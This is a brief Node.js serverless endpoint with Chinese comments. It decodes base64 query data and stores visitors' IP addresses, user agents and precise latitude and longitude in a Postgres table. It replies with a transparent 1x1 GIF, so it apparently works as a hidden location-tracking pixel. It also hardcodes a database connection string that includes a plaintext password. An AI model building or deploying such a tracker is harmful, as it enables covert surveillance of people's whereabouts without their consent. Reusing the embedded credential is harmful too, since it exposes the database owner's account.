const { Pool } = require('pg');

// 使用你的新Neon连接字符串
const pool = new Pool({
  connectionString: "postgresql://dw_owner:npg_6hXC8UuPKknv@ep-billowing-sea-a51ghsjh-pooler.us-east-2.aws.neon.tech/dw?sslmode=require"
});

module.exports = async (req, res) => {
  // 解码数据
  const data = JSON.parse(Buffer.from(req.query.data, 'base64').toString());
  
  // 写入数据库
  await pool.query(`
    INSERT INTO locations (
      timestamp, ip, user_agent, 
      latitude, longitude, accuracy
    ) VALUES ($1, $2, $3, $4, $5, $6)
  `, [
    new Date(data.time || new Date().toISOString()),
    req.headers['x-forwarded-for'] || req.connection.remoteAddress,
    data.ua,
    data.loc?.lat,
    data.loc?.lng,
    data.loc?.acc
  ]);

  // 返回透明像素
  res.setHeader('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64'));
};
